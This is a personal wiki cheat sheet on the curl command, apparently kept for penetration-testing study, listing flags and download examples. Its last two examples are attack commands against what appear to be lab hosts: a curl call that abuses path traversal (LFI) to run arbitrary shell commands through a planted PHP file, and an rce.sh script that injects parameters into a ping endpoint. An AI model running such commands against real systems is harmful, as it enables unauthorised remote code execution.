Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2020-03-28T13:43:21-05:00

====== curl ======
Created Saturday 28 March 2020

Transfer a URL

===== Download =====

==== Static ====
{{{code: lang="sh" linenumbers="False"
wget https://github.com/moparisthebest/static-curl/releases/download/v7.79.1/curl-amd64
}}}


===== Usage =====
{{{code: lang="sh" linenumbers="False"
curl [options] http|ftp://<host>:<port>/<file> [-o <dest>]
}}}


===== Flags: =====


{{{code: lang="texinfo" linenumbers="False"
-s 			 								silent 				(show no progress info)
-k 			 								Insecure. Allow connections to go through, even if they seem to be insecure
-b, --cookie <data|filename>				Sends cookie with the request: format: "key1=value1;key2=value2". If no = is found, the string is treated as a filename
-c	--cookie-jar <filename>					Stores cookies in filename + sends them with request
-d 	--data									Specify POST data, content-type=application/x-www-form-urlencoded. -d for different field may be chained
-X  --request								Specify request type eg, POST,GET,PUT,DELETE,HEAD for HTTP
-I	--head									Get response headers only (HTTP)
-o	--output								Specify output file
-L											Follow 301 redirects
-G, --get									Turns the request into a GET request. It will append the value -d, --data, --data-binary or 
											--data-urlencode  to the query string in the order placed.
											
-m, --max-time <second>						The maximum amount of time a request may last

--data-urlencode "key=value"				Append url encoded data to the request

}}}



===== Examples =====

==== Grab a file (http/s) ====
{{{code: lang="sh" linenumbers="False"
curl https://your-domain/file.pdf
}}}


==== Grab a file (ftp/s) ====
{{{code: lang="sh" linenumbers="False"
curl ftp://ftp-your-domain-name/file.tar.gz
}}}


==== Grab file with output redirected ====
{{{code: lang="sh" linenumbers="False"
curl -o file.pdf https://your-domain-name/long-file-name.pdf
}}}


==== Grab file following redirects ====
{{{code: lang="sh" linenumbers="False"
curl -L -o file.tgz http://www.cyberciti.biz/long.file.name.tgz
}}}


==== LFI Command executor ====
{{{code: lang="texinfo" linenumbers="False"
curl -G --data "urlConfig=../../../../../../../../../../../../usr/local/databases/cmd.php" --data-urlencode "cmd=$1" "http://10.11.1.116/administrator/alerts/alertConfigField.php" --output -
}}}

* This allows you to specify command with spaces and other special chars. eg "ls -lah"

==== Do POST request ====
{{{code: lang="texinfo" linenumbers="False"
┌──(kali㉿PWK)-[~/pubserv/10.11.1.31]
└─$ cat rce.sh                                 
curl -X 'POST'  --data-urlencode "action=bogus&$1" 'http://10.11.1.31/_vti_pingit/pingit.py'

}}}


===== See =====
[[Linux:wget]]
